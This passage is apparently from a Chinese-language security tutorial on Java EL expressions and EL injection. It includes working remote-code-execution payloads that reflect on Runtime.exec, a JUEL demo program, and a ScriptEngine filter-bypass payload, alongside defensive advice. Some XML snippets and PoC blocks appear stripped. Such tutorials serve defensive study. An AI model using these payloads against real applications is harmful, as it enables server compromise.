    ${header["user-agent"]}
运行结果如下：
header对象返回单一值，而headerValues则返回一个字符串数组。
### EL中的函数
EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下：
    ${ns:func(param1, param2, ...)}
ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推。比如，有函数fn:length，在JSTL库中定义，可以像下面这样来获取一个字符串的长度：
    ${fn:length("Get my length")}
要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用``标签在JSP文件中包含这些库。
### EL表达式调用Java方法
看个例子即可。
先新建一个ELFunc类，其中定义的doSomething()函数用于给输入的参数字符拼接".com"形成域名返回：
    package eltest;
    public class ELFunc {
        public static String doSomething(String str){
            return str + ".com";
        }
    }
接着在WEB-INF文件夹下（除lib和classess目录外）新建test.tld文件，其中指定执行的Java方法及其URI地址：
        1.0
        ELFunc
        http://www.mi1k7ea.com/ELFunc
            doSomething
            eltest.ELFunc
             java.lang.String doSomething(java.lang.String)
JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用`类名:方法名()`的形式来调用该类方法即可：
    ${ELFunc:doSomething("mi1k7ea")}
## 0x03 JSP中启动/禁用EL表达式
### 全局禁用EL表达式
web.xml中进入如下配置：
            *.jsp
            true
### 单个文件禁用EL表达式
在JSP文件中可以有如下定义：
该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。
JSP2.0中默认的启用EL表达式。
例如如下的JSP代码禁用EL表达式：
    ${pageContext.request.queryString}
## 0x04 EL表达式注入漏洞
EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。
一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。
### 通用PoC
    //对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）
    ${pageContext}
    //获取Web路径
    ${pageContext.getSession().getServletContext().getClassLoader().getResource("")}
    //文件头参数
    ${header}
    //获取webRoot
    ${applicationScope}
    //执行命令
    ${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc").getInputStream())}
比如我们在Java程序中可以控制输入EL表达式如下：
    ${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}
如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞：
但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。
### CVE-2011-2730
命令执行PoC如下：
再比如：
访问`http://localhost/XXX.jsp?a=$](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%2FXXX.jsp%3Fa%3D%24){applicationScope}`。
容器第一次执行EL表达式`${param.a}`获得了我们输入的`${applicationScope}`，然后Spring标签获取容器的EL表达式求值对象，把`${applicationScope}`再次执行掉，形成了漏洞。
### Wooyun案例
参考Wooyun镜像上的案例：
[搜狗某系统存在远程EL表达式注入漏洞(命令执行)](https://wooyun.x10sec.org/static/bugs/wooyun-2016-0195845.html)
[工商银行某系统存在远程EL表达式注入漏洞(命令执行)](https://wooyun.x10sec.org/static/bugs/wooyun-2016-0196160.html)
### JUEL示例
下面我们直接看下在Java代码中EL表达式注入的场景是怎么样的。
EL曾经是JSTL的一部分。然后，EL进入了JSP 2.0标准。现在，尽管是JSP 2.1的一部分，但EL API已被分离到包javax.el中，
并且已删除了对核心JSP类的所有依赖关系。换句话说：EL已准备好在非JSP应用程序中使用！
也就是说，现在EL表达式所依赖的包javax.el等都在JUEL相关的jar包中。
JUEL（Java Unified Expression
Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。
更多参考官网：
需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。
Test.java，利用反射调用Runtime类方法实现命令执行：
    import de.odysseus.el.ExpressionFactoryImpl;
    import de.odysseus.el.util.SimpleContext;
    import javax.el.ExpressionFactory;
    import javax.el.ValueExpression;
    public class Test {
        public static void main(String[] args) {
            ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
            SimpleContext simpleContext = new SimpleContext();
            // failed
            // String exp = "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')}";
            // ok
            String exp = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}";
            ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);
            System.out.println(valueExpression.getValue(simpleContext));
        }
    }
运行即触发：
## 0x05 绕过方法
这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。
### 利用反射机制绕过
即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。
### 利用ScriptEngine调用JS引擎绕过
同SpEL注入中讲到的：
    ${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}
## 0x06 防御方法
  * 尽量不使用外部输入的内容作为EL表达式内容；
  * 若使用，则严格过滤EL表达式注入漏洞的payload关键字；
  * 如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法：
        javax.el.ExpressionFactory.createValueExpression()
    javax.el.ValueExpression.getValue()
## 0x07 参考
[JSP 表达式语言](https://www.runoob.com/jsp/jsp-expression-language.html)
[EL表达式调用java方法](https://www.cnblogs.com/taoshihan/p/5638449.html)
[JAVA WEB EL表达式注入](https://www.cnblogs.com/junsec/p/11132652.html)